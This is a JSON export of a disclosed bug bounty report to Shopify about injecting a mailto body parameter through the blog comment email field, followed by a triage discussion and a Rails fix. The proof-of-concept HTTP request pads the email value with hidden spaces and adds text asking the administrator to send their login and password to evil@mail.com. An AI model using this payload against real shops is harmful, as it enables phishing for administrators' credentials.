{"id":72976,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83Mjk3Ng==","url":"https://hackerone.com/reports/72976","title":"Body injection in mailto link while commenting shop blog","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-06-28T13:19:42.550Z","submitted_at":"2015-06-28T13:19:42.550Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"skavans","url":"/skavans","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-09-10T16:41:08.997Z","bug_reporter_agreed_on_going_public_at":"2015-09-10T15:55:45.119Z","team_member_agreed_on_going_public_at":"2015-09-10T16:41:06.159Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"While commenting shop blog an attacker can inject a body attribute in email so it will be interpreted by shop administrator email-client. Attacker can make the request below to send the malicious comment:\r\n\r\n```http\r\nPOST /blogs/news/18286141-first-post/comments HTTP/1.1\r\nHost: test-4579.myshopify.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nCookie: \u003cCOOKIES_HERE\u003e\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 926\r\n\r\ncomment%5Bauthor%5D=testxss\u0026comment%5Bemail%5D=Reply%c2%a0customer%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%3Fbody%3DTo%c2%a0identify%c2%a0you%c2%a0as%c2%a0shop%c2%a0administrator%c2%a0please%c2%a0enter%c2%a0your%c2%a0login:%c2%a0________%c2%a0and%c2%a0password:%c2%a0________%c2%a0and%c2%a0send%c2%a0a%c2%a0letter%26to%3Devil@mail.com\u0026comment%5Bbody%5D=gyjghhj\r\n```\r\n\r\nSo after that the shop administrator will see this comment as present on screen1.  If the administrator device has small screen he will not see the link payload.\r\nWhen administrator clicks the link to reply customer his email client will interpret the malicious body argument so the message will look like presented in screen2. So an attacker can steal the sensitive info using social engineering.\r\n","vulnerability_information_html":"\u003cp\u003eWhile commenting shop blog an attacker can inject a body attribute in email so it will be interpreted by shop administrator email-client. Attacker can make the request below to send the malicious comment:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/blogs/news/18286141-first-post/comments\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etest-4579.myshopify.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eUser-Agent\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eMozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etext/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Language\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003een-US,en;q=0.5\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Encoding\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003egzip, deflate\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026lt;COOKIES_HERE\u0026gt;\u003c/span\u003e\n\u003cspan class=\"na\"\u003eConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ekeep-alive\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e926\u003c/span\u003e\n\ncomment%5Bauthor%5D=testxss\u0026amp;comment%5Bemail%5D=Reply%c2%a0customer%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%c2%a0%3Fbody%3DTo%c2%a0identify%c2%a0you%c2%a0as%c2%a0shop%c2%a0administrator%c2%a0please%c2%a0enter%c2%a0your%c2%a0login:%c2%a0________%c2%a0and%c2%a0password:%c2%a0________%c2%a0and%c2%a0send%c2%a0a%c2%a0letter%26to%3Devil@mail.com\u0026amp;comment%5Bbody%5D=gyjghhj\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo after that the shop administrator will see this comment as present on screen1.  If the administrator device has small screen he will not see the link payload.\u003cbr\u003e\nWhen administrator clicks the link to reply customer his email client will interpret the malicious body argument so the message will look like presented in screen2. So an attacker can steal the sensitive info using social engineering.\u003c/p\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[{"id":43248,"file_name":"screen1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/043/248/ba728095cf64f63c32f44a3740285b64827bf878/screen1.png?response-content-disposition=attachment%3B%20filename%3D%22screen1.png%22%3B%20filename%2A%3DUTF-8%27%27screen1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQ3JOVT23%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064253Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDGEmjMTZ%2B42U2ElKiFSRskfZ1wrVxF3tJ06TkMfcLk%2BAIhAMGEXUlLYHTI0tAfR14Q%2FlbZC6jasvfWZ1Xvj9WBrncpKrQDCFQQARoMMDEzNjE5Mjc0ODQ5Igw6Q27Zk4E2mhDIkK8qkQPD1saJxXJo5xzxC7fVYphiJ%2FxHiEAzAjpGAFbHRlj%2BLiBOmG4tQrsbkV%2BDoy35glVt3VI4PcrRoSV3Xl1l2IyyQg6MAvyC%2B8CnOcg10paQiOuIHqxgrORAtjeCM%2FYa%2B%2BhAC4ClNmzdap6B2rWS%2F5pSIBQv%2BEJ5ucGFGOTOhXwDWPOSwVcIjzZi84aBE8Q2Hp%2BMcECHk0MbOLdR6WMmv%2FUH8heXLI%2BruPp6jAdckhYnExze4vjNqLiF853%2FmOAZ5%2FOF%2FB5R7aky5RNPYUiVdcetKmZ6CT%2B07x3wuqCsncR%2F%2BTa7XXSwQmbv%2FX%2F9LJxuBI9m0amzD05qIaRW9JKLR141b8CMY2e8IRGQISPrCt8Qh5AMM6fBDRcYJy19FGv%2Fv76UtJCnBJ9PDHa9DBiX%2Fm7g1ESwgfanKtnd8zVHYVJNVHwEJnaoA42S8gvj9JC8LbG6wW26X%2BGNIqUhCEZdmyzvQW2TxPY5KZHKefNcp621V3psHl4EI4JPhLtsnkaIb%2BK%2FHnzGjxkH7LTYIIoehDsj1DDXsar%2FBTrqAZr%2BI5%2FjDHc%2BPm55e0u5NdPaVZOQUI4mihO6GyfNoTk4dhmqme4qPT3EW3BV4aHaQwUCpH7IKAahTGv%2BlphI%2BkZviJVM18LY2g08mzaHz81AkWCD12%2FMNsYVQR7cjgwdn0%2Bs0xVGfGhfh4MDAMmQGFe6Lif0OLiPqZvpzOsdc1U0fJguBGd%2BVFGpJYBzj3%2BaBj2VN%2BNGHLroYmrfeUAYC7jfMjbFHPWEIsnVV2UXlaBwn%2B77XmvArdijvUwKRP3s4EsxI3DWFehzXa7Gecsk2tMmt0kOjrYXTNt%2FN7x42KhOrVyhtMBIfepkwg%3D%3D\u0026X-Amz-Signature=3f11aeb454833ae761d173e2738da33352c86e96b14b85561287886600027fc3","file_size":58532,"type":"image/png"},{"id":43250,"file_name":"screen2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/043/250/aae0c3f95c8368246fdccf7d44eaab189b2726aa/screen2.png?response-content-disposition=attachment%3B%20filename%3D%22screen2.png%22%3B%20filename%2A%3DUTF-8%27%27screen2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQ3JOVT23%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T064253Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDGEmjMTZ%2B42U2ElKiFSRskfZ1wrVxF3tJ06TkMfcLk%2BAIhAMGEXUlLYHTI0tAfR14Q%2FlbZC6jasvfWZ1Xvj9WBrncpKrQDCFQQARoMMDEzNjE5Mjc0ODQ5Igw6Q27Zk4E2mhDIkK8qkQPD1saJxXJo5xzxC7fVYphiJ%2FxHiEAzAjpGAFbHRlj%2BLiBOmG4tQrsbkV%2BDoy35glVt3VI4PcrRoSV3Xl1l2IyyQg6MAvyC%2B8CnOcg10paQiOuIHqxgrORAtjeCM%2FYa%2B%2BhAC4ClNmzdap6B2rWS%2F5pSIBQv%2BEJ5ucGFGOTOhXwDWPOSwVcIjzZi84aBE8Q2Hp%2BMcECHk0MbOLdR6WMmv%2FUH8heXLI%2BruPp6jAdckhYnExze4vjNqLiF853%2FmOAZ5%2FOF%2FB5R7aky5RNPYUiVdcetKmZ6CT%2B07x3wuqCsncR%2F%2BTa7XXSwQmbv%2FX%2F9LJxuBI9m0amzD05qIaRW9JKLR141b8CMY2e8IRGQISPrCt8Qh5AMM6fBDRcYJy19FGv%2Fv76UtJCnBJ9PDHa9DBiX%2Fm7g1ESwgfanKtnd8zVHYVJNVHwEJnaoA42S8gvj9JC8LbG6wW26X%2BGNIqUhCEZdmyzvQW2TxPY5KZHKefNcp621V3psHl4EI4JPhLtsnkaIb%2BK%2FHnzGjxkH7LTYIIoehDsj1DDXsar%2FBTrqAZr%2BI5%2FjDHc%2BPm55e0u5NdPaVZOQUI4mihO6GyfNoTk4dhmqme4qPT3EW3BV4aHaQwUCpH7IKAahTGv%2BlphI%2BkZviJVM18LY2g08mzaHz81AkWCD12%2FMNsYVQR7cjgwdn0%2Bs0xVGfGhfh4MDAMmQGFe6Lif0OLiPqZvpzOsdc1U0fJguBGd%2BVFGpJYBzj3%2BaBj2VN%2BNGHLroYmrfeUAYC7jfMjbFHPWEIsnVV2UXlaBwn%2B77XmvArdijvUwKRP3s4EsxI3DWFehzXa7Gecsk2tMmt0kOjrYXTNt%2FN7x42KhOrVyhtMBIfepkwg%3D%3D\u0026X-Amz-Signature=fd5f9a90e6393766f07af6ba9c8d8d827b4ce277cd3f6de11ae5d79932209250","file_size":44977,"type":"image/png"}],"allow_singular_disclosure_at":"2015-10-10T15:55:45.339Z","allow_singular_disclosure_after":-164731628.08087444,"singular_disclosure_allowed":true,"vote_count":1,"voters":["sw33tlie"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":495752,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Other email forms are also vulnerable for this attack, for example email-editing form at the customer page (https://test-4579.myshopify.com/admin/customers/855805825) or customer information form at the checkout page (https://checkout.shopify.com/8271219/checkouts/63487bf6cb61ad2c4e728a0a1720e546).\n\nThis attack is possible because of weak input filtering, I think you miss the **^** symbol at the beginning of email checking regular expression.","markdown_message":"\u003cp\u003eOther email forms are also vulnerable for this attack, for example email-editing form at the customer page (\u003ca title=\"https://test-4579.myshopify.com/admin/customers/855805825\" href=\"/redirect?url=https%3A%2F%2Ftest-4579.myshopify.com%2Fadmin%2Fcustomers%2F855805825\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://test-4579.myshopify.com/admin/customers/855805825\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) or customer information form at the checkout page (\u003ca title=\"https://checkout.shopify.com/8271219/checkouts/63487bf6cb61ad2c4e728a0a1720e546\" href=\"/redirect?url=https%3A%2F%2Fcheckout.shopify.com%2F8271219%2Fcheckouts%2F63487bf6cb61ad2c4e728a0a1720e546\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://checkout.shopify.com/8271219/checkouts/63487bf6cb61ad2c4e728a0a1720e546\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).\u003c/p\u003e\n\n\u003cp\u003eThis attack is possible because of weak input filtering, I think you miss the \u003cstrong\u003e^\u003c/strong\u003e symbol at the beginning of email checking regular expression.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-06-29T22:06:44.273Z","updated_at":"2015-06-29T22:06:44.273Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":525250,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any updates?","markdown_message":"\u003cp\u003eAny updates?\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-25T07:38:48.632Z","updated_at":"2015-07-25T07:38:48.632Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":527074,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"The behaviour you observed was due to a bug in how Ruby on Rails generates `mailto:` links. I've submitted a pull request to the Rails project and the issue will be fixed in an upcoming release. Unfortunately, this issue is not eligible for a bounty as it falls under the category of social engineering and phishing, which is excluded from our program. Thanks again for your submission and for your interest in improving the security of the Shopify platform.","markdown_message":"\u003cp\u003eThe behaviour you observed was due to a bug in how Ruby on Rails generates \u003ccode\u003emailto:\u003c/code\u003e links. I\u0026#39;ve submitted a pull request to the Rails project and the issue will be fixed in an upcoming release. Unfortunately, this issue is not eligible for a bounty as it falls under the category of social engineering and phishing, which is excluded from our program. Thanks again for your submission and for your interest in improving the security of the Shopify platform.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-27T15:58:14.042Z","updated_at":"2015-07-27T15:58:14.042Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":527164,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, Clayton!\n\nI thought the social engineering and phishing exclusion means for example making phishing apps or websites looking like the legitimate shopify.com website. At the same time you have rewarded the content spoofing bug #58630. So both the bugs are \"phishing\", aren't they? The bug I have described is in your application and can potentially lead to some harm because of improper user input filtration. Please, let me know if I miss something.\n\nRegards,\nAnton.","markdown_message":"\u003cp\u003eHi, Clayton!\u003c/p\u003e\n\n\u003cp\u003eI thought the social engineering and phishing exclusion means for example making phishing apps or websites looking like the legitimate shopify.com website. At the same time you have rewarded the content spoofing bug \u003ca href=\"/reports/58630\"\u003e#58630\u003c/a\u003e. So both the bugs are \u0026quot;phishing\u0026quot;, aren\u0026#39;t they? The bug I have described is in your application and can potentially lead to some harm because of improper user input filtration. Please, let me know if I miss something.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nAnton.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-27T16:46:29.345Z","updated_at":"2015-07-27T16:46:29.345Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":527184,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please, note that mailto: link generating algorithm is not the root cause of the bug. The root cause is the improper user input filtration while entering email address. Your email validator allows arbitrary symbols at the beginning of the email address so there may be a regular expression error, for example the \\w+@\\w+.\\w+$ regexp is used instead of **^**\\w+@\\w+.\\w+$.","markdown_message":"\u003cp\u003ePlease, note that mailto: link generating algorithm is not the root cause of the bug. The root cause is the improper user input filtration while entering email address. Your email validator allows arbitrary symbols at the beginning of the email address so there may be a regular expression error, for example the \\w+@\\w+.\\w+$ regexp is used instead of \u003cstrong\u003e^\u003c/strong\u003e\\w+@\\w+.\\w+$.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-27T17:00:49.482Z","updated_at":"2015-07-27T17:01:34.595Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":527263,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Many special characters are allowed in the local-part of an email address, so `\\w+` is too restrictive. Our email validation intentionally allows symbols to be used there. The fix for the Rails bug will correctly encode all email addresses, including those containing symbols.","markdown_message":"\u003cp\u003eMany special characters are allowed in the local-part of an email address, so \u003ccode\u003e\\w+\u003c/code\u003e is too restrictive. Our email validation intentionally allows symbols to be used there. The fix for the Rails bug will correctly encode all email addresses, including those containing symbols.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-27T17:55:18.949Z","updated_at":"2015-07-27T17:55:18.949Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":527277,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I wrote those simple regular expression for example only, of course :)\nHope they will fix this soon!","markdown_message":"\u003cp\u003eI wrote those simple regular expression for example only, of course :)\u003cbr\u003e\nHope they will fix this soon!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-27T18:03:20.466Z","updated_at":"2015-07-27T18:03:20.466Z","actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":527304,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The pull request has already been accepted, so this will be fixed as soon as the next Rails release comes out.","markdown_message":"\u003cp\u003eThe pull request has already been accepted, so this will be fixed as soon as the next Rails release comes out.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-07-27T18:14:06.535Z","updated_at":"2015-07-27T18:14:06.535Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":583927,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"I've verified that this issue is now resolved. Because of the Rails fix (https://github.com/rails/rails/pull/21007) the email address no longer spills into the other parameters of the `mailto:` link.\n\nThanks for your interest in improving the security of the Shopify platform!","markdown_message":"\u003cp\u003eI\u0026#39;ve verified that this issue is now resolved. Because of the Rails fix (\u003ca title=\"https://github.com/rails/rails/pull/21007\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Frails%2Fpull%2F21007\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rails/rails/pull/21007\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) the email address no longer spills into the other parameters of the \u003ccode\u003emailto:\u003c/code\u003e link.\u003c/p\u003e\n\n\u003cp\u003eThanks for your interest in improving the security of the Shopify platform!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-09-10T15:51:43.043Z","updated_at":"2015-09-10T15:51:43.043Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"skavans","url":"/skavans"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":583928,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2015-09-10T15:51:53.466Z","updated_at":"2015-09-10T15:51:53.466Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":583930,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-09-10T15:55:45.147Z","updated_at":"2015-09-10T15:55:45.147Z","first_to_agree":true,"actor":{"username":"skavans","cleared":true,"url":"/skavans","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":583968,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-09-10T16:41:06.214Z","updated_at":"2015-09-10T16:41:06.214Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":583969,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-09-10T16:41:09.023Z","updated_at":"2015-09-10T16:41:09.023Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}